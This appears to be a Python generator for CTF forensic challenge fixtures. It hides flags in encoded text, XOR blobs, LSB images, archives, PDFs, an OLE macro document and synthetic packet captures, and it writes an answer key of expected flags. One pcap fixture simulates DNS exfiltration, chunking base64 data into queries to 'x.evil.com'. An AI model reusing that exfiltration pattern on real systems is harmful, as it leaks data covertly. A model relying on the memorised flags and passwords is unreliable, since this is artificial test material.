"""Generate layered CTF-style forensic challenges. Each one hides a unique flag.
Writes fixtures/ and expected.txt (one expected flag per line)."""
import base64, binascii, bz2, codecs, gzip, io, lzma, os, random, struct, subprocess, sys, tarfile, wave, zipfile, zlib
from PIL import Image, PngImagePlugin
import py7zr, zstandard

OUT = sys.argv[1]
os.makedirs(OUT, exist_ok=True)
random.seed(1337)
expected = []

def w(name, data, flag):
    p = os.path.join(OUT, name)
    os.makedirs(os.path.dirname(p), exist_ok=True)
    with open(p, "wb") as f:
        f.write(data)
    if flag:
        expected.append(flag)

def noise(n):
    return bytes(random.getrandbits(8) for _ in range(n))

def png_bytes(img, **kw):
    b = io.BytesIO(); img.save(b, "PNG", **kw); return b.getvalue()

def lsb_embed(payload, size=(120, 80), chans=3):
    img = Image.new("RGB", size)
    px = [tuple(random.randrange(256) for _ in range(3)) for _ in range(size[0] * size[1])]
    bits = [(byte >> (7 - i)) & 1 for byte in payload for i in range(8)]
    out, k = [], 0
    for p in px:
        p = list(p)
        for c in range(chans):
            if k < len(bits):
                p[c] = (p[c] & ~1) | bits[k]; k += 1
        out.append(tuple(p))
    img.putdata(out)
    return png_bytes(img)

F = lambda s: ("flag{%s}" % s)

w("01_plain.txt", b"nothing here\n" + F("plain_text").encode() + b"\n", F("plain_text"))
w("02_b64.txt", base64.b64encode(F("base64_one").encode()), F("base64_one"))
t = F("triple_b64").encode()
for _ in range(3): t = base64.b64encode(t)
w("03_triple.txt", t, F("triple_b64"))
w("04_rot13_hex.txt", binascii.hexlify(codecs.encode(F("rot13_then_hex"), "rot13").encode()), F("rot13_then_hex"))
w("05_xor.bin", bytes(b ^ 0x37 for b in noise(200) + F("single_xor").encode() + noise(100)), F("single_xor"))
key = b"k3"
w("06_repxor.bin", bytes(b ^ key[i % 2] for i, b in enumerate(b"header data " + F("repeat_xor").encode() + b" trailer")), F("repeat_xor"))
caesar = "".join(chr((ord(c) - 97 + 7) % 26 + 97) if c.islower() else c for c in F("caesar_seven"))
w("07_caesar.txt", caesar.encode(), F("caesar_seven"))

# PNG with an appended zip, whose member is gzip(base64(flag))
inner = io.BytesIO()
with zipfile.ZipFile(inner, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("secret.gz", gzip.compress(base64.b64encode(F("deep_chain").encode())))
w("08_trailer.png", png_bytes(Image.new("RGB", (40, 40), (10, 120, 200))) + inner.getvalue(), F("deep_chain"))

w("09_lsb.png", lsb_embed(F("lsb_hidden").encode() + b"\0" * 4), F("lsb_hidden"))
w("10_lsb_b64.png", lsb_embed(base64.b64encode(F("lsb_b64").encode()) + b"\n"), F("lsb_b64"))

# Height-reduced PNG with a correct header CRC? No: classic version keeps the old CRC.
img = Image.new("RGB", (64, 64), (255, 255, 255))
for y in range(40, 64):
    for x in range(64): img.putpixel((x, y), (0, 0, 0))
d = bytearray(png_bytes(img))
d[16 + 4:16 + 8] = struct.pack(">I", 40)  # height 64 -> 40, CRC left stale
w("11_short.png", bytes(d), None)

meta = PngImagePlugin.PngInfo()
meta.add_text("Comment", base64.b32encode(F("png_text_b32").encode()).decode())
w("12_text.png", png_bytes(Image.new("RGB", (8, 8)), pnginfo=meta), F("png_text_b32"))

ex = Image.Exif(); ex[0x010E] = F("exif_reversed")[::-1]
b = io.BytesIO(); Image.new("RGB", (16, 16), (200, 0, 0)).save(b, "JPEG", exif=ex.tobytes())
w("13_exif.jpg", b.getvalue(), F("exif_reversed"))

open("/tmp/zp_flag.txt", "w").write(base64.b64encode(F("zip_password").encode()).decode())
if os.path.exists(os.path.join(OUT, "14_locked.zip")): os.remove(os.path.join(OUT, "14_locked.zip"))
subprocess.run(["zip", "-j", "-q", "-P", "infected", os.path.join(OUT, "14_locked.zip"), "/tmp/zp_flag.txt"], check=True)
expected.append(F("zip_password"))

tb = io.BytesIO()
with tarfile.open(fileobj=tb, mode="w") as tf:
    data = b"%66%6c%61%67%7burl_encoded_tar%7d"
    ti = tarfile.TarInfo("notes/url.txt"); ti.size = len(data); tf.addfile(ti, io.BytesIO(data))
w("15_archive.tar.xz", lzma.compress(tb.getvalue()), F("url_encoded_tar"))

# pcap helpers
def pcap(packets, linktype=1):
    out = struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, linktype)
    for i, p in enumerate(packets):
        out += struct.pack("<IIII", 1700000000 + i, 0, len(p), len(p)) + p
    return out

def ipv4(proto, src, dst, payload):
    h = struct.pack(">BBHHHBBH4s4s", 0x45, 0, 20 + len(payload), 1, 0, 64, proto, 0, bytes(src), bytes(dst))
    return h + payload

def eth(ip):
    return b"\x00" * 6 + b"\x11" * 6 + b"\x08\x00" + ip

def tcp(sp, dp, seq, payload):
    return struct.pack(">HHIIBBHHH", sp, dp, seq, 0, 0x50, 0x18, 65535, 0, 0) + payload

def udp(sp, dp, payload):
    return struct.pack(">HHHH", sp, dp, 8 + len(payload), 0) + payload

body = b"HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nsecret=" + F("pcap_split").encode()
a, c = [10, 0, 0, 1], [10, 0, 0, 2]
pk = [eth(ipv4(6, c, a, tcp(80, 4444, 1000, body[:58]))),
      eth(ipv4(6, c, a, tcp(80, 4444, 1000, body[:58]))),  # retransmission
      eth(ipv4(6, c, a, tcp(80, 4444, 1058, body[58:])))]
w("16_http.pcap", pcap(pk), F("pcap_split"))

def dnsq(name):
    q = b"".join(bytes([len(l)]) + l.encode() for l in name.split(".")) + b"\0\0\x01\0\x01"
    return b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + q
exfil = base64.b64encode(F("dns_exfil").encode()).decode()
chunks = [exfil[i:i + 8] for i in range(0, len(exfil), 8)]
w("17_dns.pcap", pcap([eth(ipv4(17, a, c, udp(5353 + i, 53, dnsq(ch + ".x.evil.com")))) for i, ch in enumerate(chunks)]), F("dns_exfil"))

# USB keyboard (USBPcap link type 249, 27-byte header)
keymap = {**{ch: (0, 4 + i) for i, ch in enumerate("abcdefghijklmnopqrstuvwxyz")}, "{": (2, 0x2f), "}": (2, 0x30), "_": (2, 0x2d)}
reports = []
for ch in F("usb_keys"):
    mod, code = keymap[ch]
    reports += [bytes([mod, 0, code, 0, 0, 0, 0, 0]), bytes(8)]
hdr = struct.pack("<H", 27) + b"\0" * 25
w("18_usb.pcap", pcap([hdr + r for r in reports], 249), F("usb_keys"))

w("19_wide.bin", noise(64) + F("utf16_wide").encode("utf-16le") + noise(64), F("utf16_wide"))
w("20_morse.txt", b"..-. .-.. .- --. -.--. -- --- .-. ... . -.--.-", "FLAG{MORSE}")

samples = [random.randrange(-3000, 3000) for _ in range(4000)]
bits = [(byte >> (7 - i)) & 1 for byte in F("wav_lsb").encode() for i in range(8)]
for i, bt in enumerate(bits): samples[i] = (samples[i] & ~1) | bt
wb = io.BytesIO()
with wave.open(wb, "wb") as wf:
    wf.setnchannels(1); wf.setsampwidth(2); wf.setframerate(8000)
    wf.writeframes(struct.pack("<%dh" % len(samples), *samples))
w("21_audio.wav", wb.getvalue(), F("wav_lsb"))

stream = zlib.compress(b"BT /F1 12 Tf (" + F("pdf_stream").encode() + b") Tj ET")
pdf = b"%PDF-1.4\n1 0 obj<</Length " + str(len(stream)).encode() + b"/Filter/FlateDecode>>stream\n" + stream + b"\nendstream\nendobj\n%%EOF\n"
w("22_doc.pdf", pdf, F("pdf_stream"))

w("23_bz2.b64", base64.b64encode(bz2.compress(F("bzip2_inside").encode())), F("bzip2_inside"))
w("24_zstd.bin", zstandard.ZstdCompressor().compress(F("zstd_payload").encode() * 3), F("zstd_payload"))

meta = PngImagePlugin.PngInfo(); meta.add_text("note", F("xored_png"))
w("25_xored.dat", bytes(b ^ 0x42 for b in png_bytes(Image.new("RGB", (8, 8)), pnginfo=meta)), F("xored_png"))
w("26_a85.txt", b"data: " + base64.a85encode(F("ascii85").encode(), adobe=True), F("ascii85"))

def b58(b):
    A = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"; n = int.from_bytes(b, "big"); s = ""
    while n: n, r = divmod(n, 58); s = A[r] + s
    return s
w("27_b58.txt", b58(F("base58_ok").encode()).encode(), F("base58_ok"))
w("28_bin.txt", " ".join(format(c, "08b") for c in F("binary_str").encode()).encode(), F("binary_str"))

zb = io.BytesIO()
with zipfile.ZipFile(zb, "w") as z:
    z.writestr("in_lsb.txt", base64.b64encode(F("lsb_zip_b64").encode()))
w("29_lsb_zip.png", lsb_embed(zb.getvalue(), size=(200, 120)), F("lsb_zip_b64"))

sz = io.BytesIO()
with py7zr.SevenZipFile(sz, "w", password="hunter2") as z:
    z.writestr(F("seven_zip_pw").encode(), "f.txt")
w("30_locked.7z", sz.getvalue(), F("seven_zip_pw"))

# Nested folder + noise-only file
w("deep/nested/dir/31_reverse_b64.txt", base64.b64encode(F("reverse_then_b64").encode())[::-1], F("reverse_then_b64"))
w("deep/32_noise.bin", noise(200000), None)

# XOR'd zip with a repeating 3-byte key
zb = io.BytesIO()
with zipfile.ZipFile(zb, "w", zipfile.ZIP_DEFLATED) as z:
    z.writestr("x.txt", F("xor3_zip") * 5)
k = b"\x13\x37\x42"
w("33_xorzip.bin", bytes(b ^ k[i % 3] for i, b in enumerate(zb.getvalue())), F("xor3_zip"))

# --- newer decoders ---
B45A = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ $%*+-./:"
def b45enc(b):
    out = ""
    for i in range(0, len(b) - 1, 2):
        n = b[i] * 256 + b[i + 1]; out += B45A[n % 45] + B45A[(n // 45) % 45] + B45A[n // 2025]
    if len(b) % 2:
        n = b[-1]; out += B45A[n % 45] + B45A[n // 45]
    return out
w("34_b45.txt", b45enc(F("base45_ok").encode()).encode(), F("base45_ok"))

def b91enc(data):
    A = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!#$%&()*+,./:;<=>?@[]^_`{|}~"'
    b = n = 0; out = ""
    for ch in data:
        b |= ch << n; n += 8
        if n > 13:
            v = b & 8191
            if v > 88: b >>= 13; n -= 13
            else: v = b & 16383; b >>= 14; n -= 14
            out += A[v % 91] + A[v // 91]
    if n:
        out += A[b % 91]
        if n > 7 or b > 90: out += A[b // 91]
    return out
w("35_b91.txt", b91enc(F("base91_ok").encode()).encode(), F("base91_ok"))

import codecs
w("36_uu.txt", codecs.encode(F("uuencoded").encode() + b"\n", "uu"), F("uuencoded"))

def bf_print(s):
    out = ""; prev = 0
    for ch in s:
        c = ord(ch); d = c - prev; prev = c
        out += ("+" * d if d >= 0 else "-" * -d) + "."
    return out
w("38_brainfuck.txt", bf_print(F("brainfuck_ok")).encode(), F("brainfuck_ok"))

def vigenere(pt, key):
    out = ""; ki = 0
    for ch in pt:
        if ch.isalpha():
            base = 65 if ch.isupper() else 97
            out += chr((ord(ch) - base + (ord(key[ki % len(key)]) - 97)) % 26 + base); ki += 1
        else: out += ch
    return out
# Key length must be <= (prefix letters - 1) to be recoverable from "flag" alone, so 3 here.
w("39_vigenere.txt", ("noise " + vigenere(F("vigenere_ok"), "key") + " noise").encode(), F("vigenere_ok"))

# Encrypted zip whose password is only in the test wordlist.
open("/tmp/_wlflag.txt", "w").write(F("wordlist_crack"))
wlzip = os.path.join(OUT, "40_wordlist.zip")
if os.path.exists(wlzip): os.remove(wlzip)
subprocess.run(["zip", "-j", "-q", "-P", "s3cr3t_ctf_pw", wlzip, "/tmp/_wlflag.txt"], check=True)
expected.append(F("wordlist_crack"))
open(os.path.join(os.path.dirname(OUT.rstrip("/")), "wordlist.txt"), "w").write("wrong\nnope\ns3cr3t_ctf_pw\nmore\n")

# --- HTTP file extraction (gzip + chunked response) ---
def tcp_stream(sp, dp, payload):
    return eth(ipv4(6, [10, 0, 0, 9], [10, 0, 0, 8], tcp(sp, dp, 3000, payload)))
gzbody = gzip.compress(b"<p>download: " + F("http_gzip").encode() + b"</p>")
httpresp = b"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Encoding: gzip\r\nTransfer-Encoding: chunked\r\n\r\n" + b"%x\r\n" % len(gzbody) + gzbody + b"\r\n0\r\n\r\n"
w("44_http_gzip.pcap", pcap([tcp_stream(80, 7777, httpresp)]), F("http_gzip"))

bnd = "----ctfboundary"
mpbody = ("--%s\r\nContent-Disposition: form-data; name=\"f\"; filename=\"flag.txt\"\r\n\r\n%s\r\n--%s--\r\n" % (bnd, F("http_upload"), bnd)).encode()
httpreq = b"POST /u HTTP/1.1\r\nContent-Type: multipart/form-data; boundary=" + bnd.encode() + b"\r\nContent-Length: %d\r\n\r\n" % len(mpbody) + mpbody
w("45_http_upload.pcap", pcap([tcp_stream(8888, 80, httpreq)]), F("http_upload"))

# --- QR codes ---
try:
    import qrcode
    qimg = io.BytesIO(); qrcode.make(F("qr_plain")).save(qimg, "PNG")
    w("41_qr.png", qimg.getvalue(), F("qr_plain"))
    # QR carrying base64, to exercise chaining
    qb = io.BytesIO(); qrcode.make(base64.b64encode(F("qr_b64").encode()).decode()).save(qb, "PNG")
    w("42_qr_b64.png", qb.getvalue(), F("qr_b64"))
    # QR PNG hidden in the LSB of a cover image
    qp = io.BytesIO(); qrcode.make(F("qr_lsb")).save(qp, "PNG")
    w("43_qr_lsb.png", lsb_embed(qp.getvalue(), size=(360, 300)), F("qr_lsb"))
except ImportError:
    print("qrcode module not installed; skipping QR fixtures")

# --- PDF with LZW and ASCIIHex filters ---
def pdf_lzw_encode(data):
    table = {bytes([i]): i for i in range(256)}; nxt = 258; width = 9; buf = 0; nb = 0; res = bytearray()
    def emit(code):
        nonlocal buf, nb, width, res
        buf = (buf << width) | code; nb += width
        while nb >= 8:
            nb -= 8; res.append((buf >> nb) & 0xFF)
    emit(256); w = b""
    for c in data:
        wc = w + bytes([c])
        if wc in table: w = wc
        else:
            emit(table[w]); table[wc] = nxt; nxt += 1
            if nxt - 1 >= (1 << width) - 1 and width < 12: width += 1
            w = bytes([c])
    if w: emit(table[w])
    emit(257)
    if nb > 0: res.append((buf << (8 - nb)) & 0xFF)
    return bytes(res)
lzw = pdf_lzw_encode(("BT (%s) Tj ET" % F("pdf_lzw")).encode())
pdf = b"%PDF-1.4\n1 0 obj<</Length " + str(len(lzw)).encode() + b"/Filter/LZWDecode>>stream\n" + lzw + b"\nendstream\nendobj\n"
hx = ("BT (%s) Tj ET" % F("pdf_hex")).encode().hex().encode() + b">"
pdf += b"2 0 obj<</Length " + str(len(hx)).encode() + b"/Filter/ASCIIHexDecode>>stream\n" + hx + b"\nendstream\nendobj\n%%EOF\n"
w("46_pdf_filters.pdf", pdf, F("pdf_lzw"))
expected.append(F("pdf_hex"))

# --- Office OLE file with a VBA macro (raw MS-OVBA container) ---
def ole_with_macro(flag):
    FREESECT = 0xFFFFFFFF; ENDOFCHAIN = 0xFFFFFFFE; S = 512
    def comp_raw(d):
        out = bytearray(b"\x01"); off = 0
        while off < len(d):
            block = d[off:off + 4096]; off += 4096
            sf = 0x0FFF if len(block) == 4096 else (len(block) - 1) & 0x0FFF
            out += struct.pack("<H", 0x3000 | sf) + bytes(block)
        return bytes(out)
    src = b"Attribute VB_Name = \"Module1\"\r\n" + b"' pad line to exceed the mini-stream cutoff\r\n" * 120 + b"Sub A()\r\n  x = \"" + flag.encode() + b"\"\r\nEnd Sub\r\n"
    comp = comp_raw(src)
    def dirent(name, typ, start, size, child=FREESECT):
        nm = name.encode("utf-16-le") + b"\x00\x00"; nm = (nm[:64] + b"\x00" * 64)[:64]
        e = bytearray(128); e[0:len(nm)] = nm
        struct.pack_into("<H", e, 64, len(name.encode("utf-16-le")) + 2); e[66] = typ; e[67] = 1
        struct.pack_into("<I", e, 68, FREESECT); struct.pack_into("<I", e, 72, FREESECT); struct.pack_into("<I", e, 76, child)
        struct.pack_into("<I", e, 116, start); struct.pack_into("<I", e, 120, size); return bytes(e)
    data = comp + b"\x00" * ((-len(comp)) % S); nsect = len(data) // S
    fat = [FREESECT] * (S // 4)
    for i in range(nsect - 1): fat[i] = i + 1
    fat[nsect - 1] = ENDOFCHAIN; fat[nsect] = 0xFFFFFFFD; fat[nsect + 1] = ENDOFCHAIN
    fatbytes = b"".join(struct.pack("<I", x) for x in fat)
    dirb = dirent("Root Entry", 5, ENDOFCHAIN, 0, child=1) + dirent("Module1", 2, 0, len(comp))
    dirb += b"\x00" * ((S - (len(dirb) % S)) % S)
    h = bytearray(512); h[0:8] = bytes([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
    struct.pack_into("<H", h, 24, 0x3E); struct.pack_into("<H", h, 26, 3); struct.pack_into("<H", h, 28, 0xFFFE)
    struct.pack_into("<H", h, 30, 9); struct.pack_into("<H", h, 32, 6)
    struct.pack_into("<I", h, 44, 1); struct.pack_into("<I", h, 48, nsect + 1); struct.pack_into("<I", h, 56, 4096)
    struct.pack_into("<I", h, 60, ENDOFCHAIN); struct.pack_into("<I", h, 68, ENDOFCHAIN)
    struct.pack_into("<I", h, 76, nsect)
    for i in range(1, 109): struct.pack_into("<I", h, 76 + i * 4, FREESECT)
    return bytes(h) + data + fatbytes + dirb
w("47_macro.doc", ole_with_macro(F("vba_macro")), F("vba_macro"))

open(os.path.join(os.path.dirname(OUT.rstrip("/")), "expected.txt"), "w").write("\n".join(expected) + "\n")
print(len(expected), "flags hidden")
